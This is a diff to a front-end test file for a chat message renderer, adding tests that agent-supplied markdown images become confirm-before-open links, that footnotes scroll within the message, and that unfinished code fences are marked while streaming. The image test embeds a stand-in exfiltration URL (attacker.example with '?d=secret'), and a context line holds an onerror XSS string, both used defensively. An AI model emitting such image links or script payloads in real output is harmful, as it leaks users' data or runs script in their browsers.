@@ -61,6 +61,48 @@ describe('MessageResponse', () => {
     expect(container).toHaveTextContent('Use <b>bold</b> and <img src=x onerror=alert(1)> here.');
   });
 
+  it('never loads an image an agent names: it becomes a link that asks before opening', async () => {
+    const user = userEvent.setup();
+    const open = vi.spyOn(window, 'open').mockImplementation(() => null);
+    try {
+      const { container } = render(
+        <MessageResponse>{'![chart](https://attacker.example/p.png?d=secret) and ![][logo]\n\n[logo]: https://cdn.example/logo.png'}</MessageResponse>,
+      );
+      expect(container.querySelector('img')).not.toBeInTheDocument();
+      expect(document.head.querySelector('link[rel="preload"]')).not.toBeInTheDocument();
+      expect(screen.getByRole('button', { name: 'Image' })).toBeInTheDocument();
+      await user.click(screen.getByRole('button', { name: 'Image: chart' }));
+      expect(screen.getByRole('alertdialog', { name: 'Open a link to attacker.example?' })).toHaveTextContent('https://attacker.example/p.png?d=secret');
+      expect(open).not.toHaveBeenCalled();
+    } finally {
+      open.mockRestore();
+    }
+  });
+
+  it('scrolls to a footnote and back within the message, without asking to open a link', async () => {
+    const user = userEvent.setup();
+    const scrolled: string[] = [];
+    const scrollIntoView = vi.spyOn(Element.prototype, 'scrollIntoView').mockImplementation(function (this: Element) {
+      scrolled.push(this.id);
+    });
+    try {
+      render(<MessageResponse>{'A claim.[^1]\n\n[^1]: The source.'}</MessageResponse>);
+      await user.click(screen.getByRole('link', { name: '1' }));
+      expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument();
+      await user.click(screen.getByRole('link', { name: /Back to reference/ }));
+      expect(scrolled).toEqual(['user-content-fn-1', 'user-content-fnref-1']);
+    } finally {
+      scrollIntoView.mockRestore();
+    }
+  });
+
+  it('marks a code fence still arriving only while the message streams', () => {
+    const { container, rerender } = render(<MessageResponse isAnimating>{'```ts\nconst answer = 42;'}</MessageResponse>);
+    expect(container.querySelector('[data-incomplete]')).toBeInTheDocument();
+    rerender(<MessageResponse isAnimating={false}>{'```ts\nconst answer = 42;\n```'}</MessageResponse>);
+    expect(container.querySelector('[data-incomplete]')).not.toBeInTheDocument();
+  });
+
   it('opens a link only once the person confirms it, naming its host and the whole URL', async () => {
     const user = userEvent.setup();
     const open = vi.spyOn(window, 'open').mockImplementation(() => null);
